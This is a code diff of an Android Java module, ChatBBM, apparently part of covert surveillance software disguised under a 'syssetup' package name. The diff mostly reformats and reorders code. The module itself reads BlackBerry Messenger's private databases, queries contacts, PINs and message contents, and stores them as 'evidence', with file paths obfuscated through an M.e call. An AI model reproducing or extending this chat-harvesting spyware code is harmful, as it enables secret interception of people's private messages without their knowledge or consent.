@@ -2,13 +2,13 @@ package com.android.syssetup.module.chat;
 
 import android.database.Cursor;
 
+import com.android.mm.M;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.db.GenericSqliteHelper;
 import com.android.syssetup.db.RecordGroupsVisitor;
 import com.android.syssetup.db.RecordVisitor;
 import com.android.syssetup.module.ModuleAddressBook;
 import com.android.syssetup.util.Check;
-import com.android.mm.M;
 
 import org.xml.sax.SAXException;
 
@@ -26,36 +26,19 @@ public class ChatBBM extends SubModuleChat {
 
 
 	private static final int BBM_v1 = 1;
-	private static final int BBM_v2 = 0;
 	private int version = BBM_v1;
-
-	public class Account {
-
-		public int id;
-		public String displayName;
-		public String pin;
-
-		public String getName() {
-			return (pin + " " + displayName).trim().toLowerCase();
-		}
-	}
-
+	private static final int BBM_v2 = 0;
 	private static final String TAG = "ChatBBM";
 	private static final int PROGRAM = 0x05; // anche per addressbook
-
 	String pObserving = M.e("com.bbm");
 	String dbFileMaster = M.e("/data/data/com.bbm/files/bbmcore/master.db");
 	String dbFileGroup = M.e("/data/data/com.bbm/files/bbgroups/bbgroups.db");
-
-	private long lastBBM;
 	Semaphore readChatSemaphore = new Semaphore(1, true);
-
+	private long lastBBM;
 	private Account account;
-
-	//private GenericSqliteHelper helper;
-
 	private boolean firstTime = true;
 
+	//private GenericSqliteHelper helper;
 	private boolean started;
 
 	@Override
@@ -119,7 +102,6 @@ public class ChatBBM extends SubModuleChat {
 			readChatSemaphore.release();
 		}
 	}
-
 
 	@Override
 	protected void start() {
@@ -226,7 +208,7 @@ public class ChatBBM extends SubModuleChat {
 
 		String timestamp = Long.toString(this.lastBBM / 1000);
 		final ChatGroups groups = new ChatGroups();
-		RecordGroupsVisitor visitorGrp = new RecordGroupsVisitor(groups,"T.TIMESTAMP", true);
+		RecordGroupsVisitor visitorGrp = new RecordGroupsVisitor(groups, "T.TIMESTAMP", true);
 		String[] sql = new String[]{"SELECT C.CONVERSATIONID,P.USERID,U.DISPLAYNAME,U.PIN FROM PARTICIPANTS AS P " +
 				"JOIN CONVERSATIONS AS C ON C.CONVERSATIONID = P.CONVERSATIONID " +
 				"JOIN USERS AS U ON U.USERID = P.USERID " +
@@ -236,12 +218,12 @@ public class ChatBBM extends SubModuleChat {
 						"JOIN USERS AS U ON U.USERID = P.USERID " +
 						"JOIN USERPINS AS S ON U.USERID = S.USERID " +
 						"WHERE C.MESSAGETIMESTAMP > ?"
-				};
+		};
 
 		helper.traverseRawQuery(sql[version], new String[]{timestamp}, visitorGrp);
 		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
-		if(groups.getAllGroups().size()==0){
+		if (groups.getAllGroups().size() == 0) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readBBMConversationHistory), No groups ");
 			}
@@ -249,14 +231,14 @@ public class ChatBBM extends SubModuleChat {
 		}
 
 		Contact me = groups.getContact("0");
-		if(me == null){
+		if (me == null) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readBBMConversationHistory), ERROR: cannot get contact 0");
 			}
 
 			return 0;
 		}
-		final String me_number =me.number;
+		final String me_number = me.number;
 		final String me_name = me.name;
 
 		RecordVisitor visitorMsg = new RecordVisitor(null, null, "T.TIMESTAMP") {
@@ -275,12 +257,12 @@ public class ChatBBM extends SubModuleChat {
 				String peer = contact.name;
 
 				String from_id, from, to_id, to;
-				if(incoming){
+				if (incoming) {
 					from_id = peer_id;
 					from = peer;
 					to_id = groups.getGroupToName(from_id, groupid);
 					to = groups.getGroupToDisplayName(from_id, groupid);
-				}else{
+				} else {
 					from_id = me_number;
 					from = me_name;
 					to_id = groups.getGroupToName(from_id, groupid);
@@ -293,7 +275,7 @@ public class ChatBBM extends SubModuleChat {
 			}
 		};
 
-		String sqlmsg ="SELECT C.CONVERSATIONID,T.TIMESTAMP,T.CONTENT, U.USERID\n" +
+		String sqlmsg = "SELECT C.CONVERSATIONID,T.TIMESTAMP,T.CONTENT, U.USERID\n" +
 				"FROM TEXTMESSAGES AS T\n" +
 				"JOIN CONVERSATIONS AS C ON T.CONVERSATIONID = C.CONVERSATIONID\n" +
 				"JOIN PARTICIPANTS AS P ON P.PARTICIPANTID = T.PARTICIPANTID\n" +
@@ -302,9 +284,9 @@ public class ChatBBM extends SubModuleChat {
 				"AND C.CONVERSATIONID=?\n";
 
 		long maxid = 0;
-		for( String group: groups.getAllGroups() ){
+		for (String group : groups.getAllGroups()) {
 			long ret = helper.traverseRawQuery(sqlmsg, new String[]{timestamp, group}, visitorMsg);
-			maxid=Math.max(ret, maxid);
+			maxid = Math.max(ret, maxid);
 		}
 
 		getModule().saveEvidence(messages);
@@ -394,5 +376,16 @@ public class ChatBBM extends SubModuleChat {
 		helper.traverseRawQuery(sql, null, visitor);
 
 		ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.BBM, account.getName());
+	}
+
+	public class Account {
+
+		public int id;
+		public String displayName;
+		public String pin;
+
+		public String getName() {
+			return (pin + " " + displayName).trim().toLowerCase();
+		}
 	}
 }
